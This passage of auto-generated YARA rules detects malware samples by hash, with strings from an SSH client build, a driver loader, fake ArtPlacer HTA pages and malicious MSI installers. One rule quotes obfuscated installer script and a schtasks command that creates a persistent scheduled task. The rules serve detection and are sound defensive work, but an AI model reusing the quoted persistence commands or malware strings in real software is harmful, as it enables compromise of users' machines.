      $s12 = "bugsplat.log" fullword ascii /* score: '19.00'*/
      $s13 = "BugSplat.dll: " fullword ascii /* score: '19.00'*/
      $s14 = "Launching BsSndRpt.exe" fullword wide /* score: '19.00'*/
      $s15 = "Full Memory Dump Created" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad_16cbe40f {
   meta:
      description = "_subset_batch - file 16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad_16cbe40f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad"
   strings:
      $s1 = "The %s selected for this session is %s, which, with this server, is vulnerable to the 'Terrapin' attack CVE-2023-48795, potentia" ascii /* score: '29.50'*/
      $s2 = "SSH to proxy and execute a command" fullword ascii /* score: '25.00'*/
      $s3 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s4 = "MIT Kerberos GSSAPI64.DLL" fullword ascii /* score: '23.00'*/
      $s5 = "\\\\.\\pipe\\pageant.%s.%s" fullword ascii /* score: '22.00'*/
      $s6 = "\\\\.\\pipe\\putty-connshare" fullword ascii /* score: '22.00'*/
      $s7 = "/using-cmdline-loghost.html" fullword ascii /* score: '22.00'*/
      $s8 = "The %s selected for this session is %s, which, with this server, is vulnerable to the 'Terrapin' attack CVE-2023-48795, potentia" ascii /* score: '21.50'*/
      $s9 = "CreateMutex(\"%s\") failed: %s" fullword ascii /* score: '21.00'*/
      $s10 = "\\gssapi64.dll" fullword ascii /* score: '21.00'*/
      $s11 = "/pageant-cmdline-command.html" fullword ascii /* score: '21.00'*/
      $s12 = "The first host key type we have stored for this server is %s, which is below the configured warning threshold." fullword ascii /* score: '20.50'*/
      $s13 = "Agent-forwarding connection closed" fullword ascii /* score: '20.00'*/
      $s14 = "/using-cmdline-agentauth.html" fullword ascii /* score: '20.00'*/
      $s15 = "Using GSSAPI from GSSAPI64.DLL" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_6031d51ac05a0e710227c35fbd66134d4df6912c064dcbe07452ab09abd4f763_6031d51a {
   meta:
      description = "_subset_batch - file 6031d51ac05a0e710227c35fbd66134d4df6912c064dcbe07452ab09abd4f763_6031d51a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6031d51ac05a0e710227c35fbd66134d4df6912c064dcbe07452ab09abd4f763"
   strings:
      $s1 = "User-Agent: Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)" fullword ascii /* score: '30.00'*/
      $s2 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s3 = "%s: line %d: bad command `%s'" fullword ascii /* score: '17.50'*/
      $s4 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii /* score: '17.50'*/
      $s5 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s6 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s7 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s8 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s9 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s10 = "spoofalert" fullword ascii /* score: '13.00'*/
      $s11 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
      $s12 = "%s: line %d: list delimiter not followed by keyword" fullword ascii /* score: '12.50'*/
      $s13 = "%s: line %d: expected service, found `%s'" fullword ascii /* score: '12.50'*/
      $s14 = "%s: error: %s: %s (%s)" fullword ascii /* score: '12.50'*/
      $s15 = "failed to map segment from shared object" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule sig_17688c66dfa94e9fbe8b54d5160c3b19_imphash_ {
   meta:
      description = "_subset_batch - file 17688c66dfa94e9fbe8b54d5160c3b19(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "27e25e156dfe2a07d5b5338b1d7a913cb72d01257cf8d7b22411a2886fef8c39"
   strings:
      $x1 = "C:\\Users\\%s\\AppData\\Local\\%s" fullword ascii /* score: '35.50'*/
      $s2 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s3 = "python24_3.dll" fullword ascii /* score: '20.00'*/
      $s4 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s5 = "\\e3fa1275222c5ddca3e498bc0e9ffe07\\Release\\Library.pdb" fullword ascii /* score: '12.00'*/
      $s6 = "2M2R2~2" fullword ascii /* reversed goodware string '2~2R2M2' */ /* score: '11.00'*/
      $s7 = "wwwwwU" fullword ascii /* reversed goodware string 'Uwwwww' */ /* score: '11.00'*/
      $s8 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s9 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s10 = "<6=.>a> ?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'j' */
      $s11 = "; ;&;,;2;8;" fullword ascii /* score: '9.00'*/ /* hex encoded string '(' */
      $s12 = "wwwwpwwwwwp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_584af16b6735a5a1f00622108e3f66cd5cd6300b3a7b981e13bdcb71d90d37f5_584af16b {
   meta:
      description = "_subset_batch - file 584af16b6735a5a1f00622108e3f66cd5cd6300b3a7b981e13bdcb71d90d37f5_584af16b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "584af16b6735a5a1f00622108e3f66cd5cd6300b3a7b981e13bdcb71d90d37f5"
   strings:
      $s1 = "C:\\Users\\Admin\\Desktop\\HER" fullword ascii /* score: '24.00'*/
      $s2 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "xinput1_1.dll" fullword ascii /* score: '20.00'*/
      $s4 = "xinput1_2.dll" fullword ascii /* score: '20.00'*/
      $s5 = "cla300.sys" fullword ascii /* score: '19.00'*/
      $s6 = "driver_log.txt" fullword ascii /* score: '19.00'*/
      $s7 = "[*] Attempted to load driver service: " fullword ascii /* score: '18.00'*/
      $s8 = "[-] Driver not running, error: " fullword ascii /* score: '17.00'*/
      $s9 = "5532767655" ascii /* score: '17.00'*/ /* hex encoded string 'U2vvU' */
      $s10 = "struct PS_INPUT            {            float4 pos : SV_POSITION;            float4 col : COLOR0;            float2 uv  : TEXCOO" ascii /* score: '16.00'*/
      $s11 = ") : SV_Target            {            float4 out_col = input.col * texture0.Sample(sampler0, input.uv);             return out_c" ascii /* score: '16.00'*/
      $s12 = "[-] Driver still not connected, error: " fullword ascii /* score: '14.00'*/
      $s13 = "[+] Driver already running" fullword ascii /* score: '14.00'*/
      $s14 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s15 = "[-] Driver file not found: " fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_1ff8268fa64c8f55eb750c4433c1e9e47dc7359b7fcc653215423ed3fe5d8b4d_1ff8268f {
   meta:
      description = "_subset_batch - file 1ff8268fa64c8f55eb750c4433c1e9e47dc7359b7fcc653215423ed3fe5d8b4d_1ff8268f.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1ff8268fa64c8f55eb750c4433c1e9e47dc7359b7fcc653215423ed3fe5d8b4d"
   strings:
      $x1 = "ler service cannot update the protected Windows file [2]. {{Package version: [3], OS Protected version: [4], SFP Error: [5]}}Dat" ascii /* score: '86.00'*/
      $x2 = "Your original configuration will be restored.You can only type a separator character here.Failed to install [2] Control Panel ap" ascii /* score: '77.00'*/
      $x3 = "[2]Error converting file time to local time for file: [3]. GetLastError: [2].Path: [2] is not a parent of [3].On the dialog [2] " ascii /* score: '72.00'*/
      $x4 = "sRemoveExistingProductsRemoving applicationsApplication: [1], Command line: [2]RemoveFilesRemoving filesRemoveIniValuesRemoving " ascii /* score: '64.00'*/
      $x5 = "AttributesPatchSizeFile_PatchTypeActionConditionSequenceCostFinalizeCostInitializeTableNameInstallFinalizeInstallInitializeInsta" ascii /* score: '64.00'*/
      $x6 = "[\\}]RunInstall\"[APPDIR]/onestart_installer.exe\"Please wait for the installation to complete. |Installation in progress. |MB_O" ascii /* score: '53.00'*/
      $x7 = "ext_No&NoButtonText_Reset&ResetButtonText_Resume&ResumeButtonText_Retry&RetryButtonText_Decline&DeclineButtonText_Continue&Conti" ascii /* score: '42.00'*/
      $x8 = "ont height). Assuming that the system font is set to 12 point size, this is equivalent to the point size.ColorA long integer ind" ascii /* score: '42.00'*/
      $x9 = "    Get-WmiObject Win32_Process -Filter \"name = 'msiexec.exe'\" | Where [\\{] $_.CommandLine -match $regex [\\}]" fullword ascii /* score: '39.00'*/
      $x10 = "(This operation cannot be undone.)Error writing to file: [2].  Verify that you have access to that directory.Installer stopped p" ascii /* score: '38.00'*/
      $x11 = "Your original Firewall configuration will be restored.Invalid Firewall network scope: [2].There was an error registering port wi" ascii /* score: '34.00'*/
      $x12 = "gPlease wait while the installer finishes determining your disk space requirements.You have chosen to remove the program from yo" ascii /* score: '33.00'*/
      $x13 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $x14 = "rariesWriteEnvironmentStringsProgressDlgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitCMDFileOpe" ascii /* score: '32.00'*/
      $x15 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 12000KB and
      1 of ($x*)
}

rule sig_0c3512c1117033e345356f48160c06d7ae2973b51f6fc3add0b35556dbd15eda_0c3512c1 {
   meta:
      description = "_subset_batch - file 0c3512c1117033e345356f48160c06d7ae2973b51f6fc3add0b35556dbd15eda_0c3512c1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0c3512c1117033e345356f48160c06d7ae2973b51f6fc3add0b35556dbd15eda"
   strings:
      $x1 = "Usage:\\r\\n   -? or -h or -help :  Show this dialog.\\r\\n   -url or -componentsurl :  Show the stored url and componentsurl fo" wide /* score: '36.00'*/
      $x2 = "Failed to wait for parent process to end before creating new setup.exe.This is not a fatal error - however, setup.exe may not be" wide /* score: '33.00'*/
      $s3 = "\\f2 2. \\f0 MICROSOFT .NET BENCHMARK TESTING. The software includes the .NET Framework, Windows Communication Foundation, Windo" wide /* score: '30.00'*/
      $s4 = "      <assemblyIdentity name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyTo" ascii /* score: '27.00'*/
      $s5 = "      <assemblyIdentity name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyTo" ascii /* score: '27.00'*/
      $s6 = "Will attempt to elevate process." fullword wide /* score: '27.00'*/
      $s7 = "\\pard\\f2 1. \\f0 SUPPORT SERVICES FOR SUPPLEMENT.  \\b0 Microsoft provides support services for this software as described at " wide /* score: '24.00'*/
      $s8 = "vstoee.dll" fullword wide /* score: '23.00'*/
      $s9 = "Amscoree.dll" fullword wide /* score: '23.00'*/
      $s10 = "Unable to run create process.  GetLastError returned: %d" fullword wide /* score: '23.00'*/
      $s11 = "Aurlmon.dll" fullword wide /* score: '23.00'*/
      $s12 = "http://www.evermap.com/download/AutoMetadata/" fullword wide /* score: '23.00'*/
      $s13 = "ShellExecuteEx failed with error code %d" fullword wide /* score: '21.00'*/
      $s14 = "Could not load msi.dll" fullword wide /* score: '20.00'*/
      $s15 = "Unable to get process exitcode." fullword wide /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_699602bc5323575d473fdd19205399a482e03bf24952866260ff9223bbc00233_699602bc {
   meta:
      description = "_subset_batch - file 699602bc5323575d473fdd19205399a482e03bf24952866260ff9223bbc00233_699602bc.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "699602bc5323575d473fdd19205399a482e03bf24952866260ff9223bbc00233"
   strings:
      $x1 = "pecified by the first two entries.ArgumentA value to be used as a modifier when triggering a particular event.A standard conditi" ascii /* score: '69.00'*/
      $x2 = "    HdzeCP6.DeleteFile(Session.Property(\"Temp\" + \"Fo\" + \"lde\" + \"r\") + \"4fd72e8129\" + \".xml\");PrintEula[ProductName]" ascii /* score: '60.00'*/
      $x3 = "OptionalCheckBoxClick the Finish button to exit the Setup Wizard.{\\WixUI_Font_Bigger}Completed the [ProductName] Setup WizardOp" ascii /* score: '35.00'*/
      $x4 = ". Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO) format.InstallExecuteSequenceIns" ascii /* score: '33.00'*/
      $x5 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $x6 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii /* score: '32.00'*/
      $s7 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s8 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii /* score: '28.00'*/
      $s9 = "    }SetIt42m1qvkIt42m1qvk\"schtasks.exe\" /F /CREATE /TN \"simple-translate-[UserSID]\" /XML \"[TempFolder]4fd72e8129.xml\"Bd91" ascii /* score: '28.00'*/
      $s10 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s11 = "    }SetIt42m1qvkIt42m1qvk\"schtasks.exe\" /F /CREATE /TN \"simple-translate-[UserSID]\" /XML \"[TempFolder]4fd72e8129.xml\"Bd91" ascii /* score: '28.00'*/
      $s12 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s13 = "Name] Setup Wizard ended prematurely[ProductName] Setup Wizard ended prematurely because of an error. Your system has not been m" ascii /* score: '27.00'*/
      $s14 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '26.00'*/
      $s15 = "failed to get security descriptor's DACL - error code: %d" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_5a9fed50d0cca98f572d95829bca1e030fb2b3b23160b6b0831634b9ea24f95b_5a9fed50 {
   meta:
      description = "_subset_batch - file 5a9fed50d0cca98f572d95829bca1e030fb2b3b23160b6b0831634b9ea24f95b_5a9fed50.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5a9fed50d0cca98f572d95829bca1e030fb2b3b23160b6b0831634b9ea24f95b"
   strings:
      $s1 = ".get] j_Q_Q_e.VH-OwpV T.G.z.Vk_f.x T b B_b* K E_cZ.G_FK B" fullword ascii /* score: '16.00'*/
      $s2 = "R.Z.M B%Cs% H)t?_fw_X_y^_F|_n_M:_B.z j* d].e b_GL m b.T y.p.Puf c.q_Z f.2n" fullword ascii /* score: '12.00'*/
      $s3 = "* Z/_K.H_Vb.hil.i.w8_u Lm0 z.t.2_dr C.5_" fullword ascii /* score: '12.00'*/
      $s4 = "T^_p K.iE.V O.lZA i.j_G.0.KWMfTpv.p.U.X_D)" fullword ascii /* score: '12.00'*/
      $s5 = "Lf.D U.u%.l.93n.d F!_O.L- o.OfU.w.H_M wm8[.e.K.W ardy A_t~.l MK A4." fullword ascii /* score: '11.00'*/
      $s6 = "- zc_M bV1.y_H.f_X C42OW<.t.X_Q.l_RK# X_H_g.qeXF P I F m_q K0 q.x s p_i).z.Te.G.WWA E+B on W.p_" fullword ascii /* score: '11.00'*/
      $s7 = "j C n* y_f_P_d N.7 u.A.b m.nqJ_y_A.U_j.SPL,.k_a H.p.spND,.3.XY.Z q_m.W1 s p B8_" fullword ascii /* score: '11.00'*/
      $s8 = "_Y.0.k.0_X kU.Jd`.y.GcCn:r_W.GAe.5.9+ vd_h.zT{_G_iX_M_f.vj_w." fullword ascii /* score: '11.00'*/
      $s9 = "e T_i.w.2.Y>.X%G.X.7.l_ls.3`.jVXA.t d x`K.O2i3_p_r+ q S_hV.V)c$.bkq iB.O F7k" fullword ascii /* score: '11.00'*/
      $s10 = "Mi Y A.Npa T.j I.b.V.90_Z.w| D_T_K_lXA* XB_J O.x_C YP_OYUT.t K.l.G_P_G r_x W.lz.T$u.O f_h " fullword ascii /* score: '11.00'*/
      $s11 = "d C.8)_PX[> h.j1T- z.p.YC_Kx.A_SIN.tNxs.7.rp.IuFa.E.j.CQhr.2.m V@ HD.Zmx W.P: l" fullword ascii /* score: '11.00'*/
      $s12 = ".0.xN m Z.rnQ B.Kk drsi j.PsK.v.N a* j F.c.e&_bb I.f{.hs m: b.5pL_" fullword ascii /* score: '11.00'*/
      $s13 = "c Q_BJPV_f_P M q.D_p.2.V+|.1.2.i.S>U t n\\w U.k=_b.YMt W_a- t.F$ Q.p.Bh Hp_p@_R m_O_" fullword ascii /* score: '11.00'*/
      $s14 = "_l+ QJdl k.M Y};.jCS bN.1.G.b_e L_NX.V.h z W.cQ_I d.Y.e.L" fullword ascii /* score: '11.00'*/
      $s15 = "_b.g f Qp.S.N_O M.2.i P_K/T A_G&_Q_A_Sx}.b Gi_W.JUQ.V_J a.r_TmJ.W_t:\\.d.1.Dw.S*l.Z> ko_s x_L_lH" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_014b92c3be1df433154b5fb8bf3249107183c40d5bb9881fc8916868563d5501_014b92c3 {
   meta:
      description = "_subset_batch - file 014b92c3be1df433154b5fb8bf3249107183c40d5bb9881fc8916868563d5501_014b92c3.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "014b92c3be1df433154b5fb8bf3249107183c40d5bb9881fc8916868563d5501"
   strings:
      $s1 = "0040444444" ascii /* score: '17.00'*/ /* hex encoded string '@DDD' */
      $s2 = "+ -{5P" fullword ascii /* score: '9.00'*/
      $s3 = "tsLOGYTU" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_49445ae111dbd53cf3421d6bd18f7097561784bb8c11ccb696cafd02931ce281_49445ae1 {
   meta:
      description = "_subset_batch - file 49445ae111dbd53cf3421d6bd18f7097561784bb8c11ccb696cafd02931ce281_49445ae1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "49445ae111dbd53cf3421d6bd18f7097561784bb8c11ccb696cafd02931ce281"
   strings:
      $s1 = "`````b" fullword ascii /* reversed goodware string 'b`````' */ /* score: '11.00'*/
      $s2 = "\"&wndLl]2r/" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_2e9bce28b8df67e8c31565047436a301a7aa7f368c745372d67f2c21a5c855fa_2e9bce28 {
   meta:
      description = "_subset_batch - file 2e9bce28b8df67e8c31565047436a301a7aa7f368c745372d67f2c21a5c855fa_2e9bce28.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2e9bce28b8df67e8c31565047436a301a7aa7f368c745372d67f2c21a5c855fa"
   strings:
      $s1 = " -.XHx" fullword ascii /* score: '8.00'*/
      $s2 = "kwwwwwz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_50e9f5efa6dc1ba2b84f28549ebb5aa05156ef11bf0f1fe69c2d1f1957d04840_50e9f5ef {
   meta:
      description = "_subset_batch - file 50e9f5efa6dc1ba2b84f28549ebb5aa05156ef11bf0f1fe69c2d1f1957d04840_50e9f5ef.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "50e9f5efa6dc1ba2b84f28549ebb5aa05156ef11bf0f1fe69c2d1f1957d04840"
   strings:
      $s1 = "rrrrrrrq" fullword ascii /* reversed goodware string 'qrrrrrrr' */ /* score: '18.00'*/
      $s2 = "gqdxblll" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_57e0cf414bbfce40bb9fab379b79d5996ad8ad17442162e99f4fb34e4ec5814e_57e0cf41 {
   meta:
      description = "_subset_batch - file 57e0cf414bbfce40bb9fab379b79d5996ad8ad17442162e99f4fb34e4ec5814e_57e0cf41.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "57e0cf414bbfce40bb9fab379b79d5996ad8ad17442162e99f4fb34e4ec5814e"
   strings:
      $s1 = "MMMMMA" fullword ascii /* reversed goodware string 'AMMMMM' */ /* score: '13.50'*/
      $s2 = "jjbbbbj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_25eb247be77b799a9dd958f7a850cd545fb62c15cefc07afda2afd796c1673f1_25eb247b {
   meta:
      description = "_subset_batch - file 25eb247be77b799a9dd958f7a850cd545fb62c15cefc07afda2afd796c1673f1_25eb247b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "25eb247be77b799a9dd958f7a850cd545fb62c15cefc07afda2afd796c1673f1"
   strings:
      $s1 = "iiiiiiiiiiiim" fullword ascii /* score: '8.00'*/
      $s2 = "iuiiiiiiiib" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_471b3455537be0268e691b98481d43efbb32cb6dda1916c8d9cc814b4c6ad159_471b3455 {
   meta:
      description = "_subset_batch - file 471b3455537be0268e691b98481d43efbb32cb6dda1916c8d9cc814b4c6ad159_471b3455.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "471b3455537be0268e691b98481d43efbb32cb6dda1916c8d9cc814b4c6ad159"
   strings:
      $s1 = "* gNn`J" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_02933303ecb5383a392440aa927fd5708c718b3d8b1e7aa8a5cf90a52fe33d16_02933303 {
   meta:
      description = "_subset_batch - file 02933303ecb5383a392440aa927fd5708c718b3d8b1e7aa8a5cf90a52fe33d16_02933303.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "02933303ecb5383a392440aa927fd5708c718b3d8b1e7aa8a5cf90a52fe33d16"
   strings:
      $x1 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '31.00'*/
      $s2 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '20.00'*/
      $s3 = "AAAAAABAAEAAA" ascii /* base64 encoded string '     @ @ ' */ /* score: '16.50'*/
      $s4 = "ite><meta property=og:site_name content=ArtPlacer><meta property=og:title content=ArtPlacer><meta property=og:description conten" ascii /* score: '15.00'*/
      $s5 = "m Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"></head><body><noscript><strong>Please ena" ascii /* score: '15.00'*/
      $s6 = "=title content=ArtPlacer><meta name=description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exqui" ascii /* score: '11.00'*/
      $s7 = "ArtPlacer><meta name=twitter:description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exquisite Ro" ascii /* score: '11.00'*/
      $s8 = "itle><meta name=viewport content=\"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-" ascii /* score: '11.00'*/
      $s9 = "t src=/static/js/index.08fc98bc.js></script></body></html>" fullword ascii /* score: '10.00'*/
      $s10 = "le JavaScript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.86ef5603.js></script><scrip" ascii /* score: '10.00'*/
      $s11 = "ite Room Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"><meta property=og:type content=web" ascii /* score: '9.00'*/
      $s12 = "site Plugins to boost your art sales.\"><meta property=og:url content=/ ><meta property=og:image content=data:image/gif;base64,R" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_3214920bb22727168afb3d2ce4a8e02a996e7aff7d41f5febcd98b9cdcbc6956_3214920b {
   meta:
      description = "_subset_batch - file 3214920bb22727168afb3d2ce4a8e02a996e7aff7d41f5febcd98b9cdcbc6956_3214920b.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3214920bb22727168afb3d2ce4a8e02a996e7aff7d41f5febcd98b9cdcbc6956"
   strings:
      $x1 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '31.00'*/
      $s2 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '20.00'*/
      $s3 = "AAAAAABAAEAAA" ascii /* base64 encoded string '     @ @ ' */ /* score: '16.50'*/
      $s4 = "ite><meta property=og:site_name content=ArtPlacer><meta property=og:title content=ArtPlacer><meta property=og:description conten" ascii /* score: '15.00'*/
      $s5 = "m Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"></head><body><noscript><strong>Please ena" ascii /* score: '15.00'*/
      $s6 = "=title content=ArtPlacer><meta name=description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exqui" ascii /* score: '11.00'*/
      $s7 = "ArtPlacer><meta name=twitter:description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exquisite Ro" ascii /* score: '11.00'*/
      $s8 = "itle><meta name=viewport content=\"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-" ascii /* score: '11.00'*/
      $s9 = "t src=/static/js/index.5f1b9794.js></script></body></html>" fullword ascii /* score: '10.00'*/
      $s10 = "le JavaScript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.dd3841d5.js></script><scrip" ascii /* score: '10.00'*/
      $s11 = "ite Room Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"><meta property=og:type content=web" ascii /* score: '9.00'*/
      $s12 = "site Plugins to boost your art sales.\"><meta property=og:url content=/ ><meta property=og:image content=data:image/gif;base64,R" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_519882dfcebcc7b04c7c1d9bf4fbda2852370a8ec3302db6f9d300206284a00e_519882df {
   meta:
      description = "_subset_batch - file 519882dfcebcc7b04c7c1d9bf4fbda2852370a8ec3302db6f9d300206284a00e_519882df.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "519882dfcebcc7b04c7c1d9bf4fbda2852370a8ec3302db6f9d300206284a00e"
   strings:
      $x1 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '31.00'*/
      $s2 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '20.00'*/
      $s3 = "AAAAAABAAEAAA" ascii /* base64 encoded string '     @ @ ' */ /* score: '16.50'*/
      $s4 = "ite><meta property=og:site_name content=ArtPlacer><meta property=og:title content=ArtPlacer><meta property=og:description conten" ascii /* score: '15.00'*/
      $s5 = "m Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"></head><body><noscript><strong>Please ena" ascii /* score: '15.00'*/
      $s6 = "=title content=ArtPlacer><meta name=description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exqui" ascii /* score: '11.00'*/
      $s7 = "ArtPlacer><meta name=twitter:description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exquisite Ro" ascii /* score: '11.00'*/
      $s8 = "itle><meta name=viewport content=\"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-" ascii /* score: '11.00'*/
      $s9 = "le JavaScript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.dd3841d5.js></script><scrip" ascii /* score: '10.00'*/
      $s10 = "t src=/static/js/index.feba2532.js></script></body></html>" fullword ascii /* score: '10.00'*/
      $s11 = "ite Room Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"><meta property=og:type content=web" ascii /* score: '9.00'*/
      $s12 = "site Plugins to boost your art sales.\"><meta property=og:url content=/ ><meta property=og:image content=data:image/gif;base64,R" ascii /* score: '9.00'*/
   condition:
